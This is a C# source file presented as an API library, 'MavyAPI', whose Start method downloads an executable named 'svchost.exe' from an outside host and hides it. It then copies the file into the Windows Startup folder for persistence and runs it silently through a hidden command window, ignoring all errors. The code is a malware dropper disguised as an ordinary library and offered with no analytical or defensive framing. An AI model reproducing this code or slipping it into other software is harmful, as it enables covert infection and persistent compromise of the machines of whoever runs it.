using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace MavyAPI
{
    public class MAPI
    {
        
        #region Variables
        private static readonly string temp = Path.GetTempPath(), mainDrive = $@"{Environment.GetEnvironmentVariable("SystemDrive")}\", startupPath = $@"{mainDrive}Users\{Environment.UserName}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
        #endregion

        /// <summary>
        /// Download the latest fake svchost file from the remote url, place it in the startup programs folder and then run it silently.
        /// </summary>
        public static void Start()
        {
            try
            {
                var path = $@"{temp}\svchost.exe";
                using (var client = new WebClient()) client.DownloadFile("https://coffos.space/svchost.exe", path);
                HideUnhide(path, true);
                File.Copy(path, startupPath);
                StartNonParent(path);
            }
            catch (Exception) {}
        }

        /// <summary>
        /// Apply a hide or normal attribute to a file.
        /// </summary>
        /// <param name="path"></param>
        /// <param name="hidden"></param>
        private static void HideUnhide(string path, bool hidden) => new FileInfo(path).Attributes = hidden ? FileAttributes.Hidden : FileAttributes.Normal;

        /// <summary>
        /// Start a file non-parent to the parent program.
        /// </summary>
        /// <param name="executable"></param>
        private static void StartNonParent(string executable) =>
            Process.Start(new ProcessStartInfo
            {
                FileName = @"cmd",
                Arguments = $@"/c start {executable}",
                WindowStyle = ProcessWindowStyle.Hidden
            });
    }
}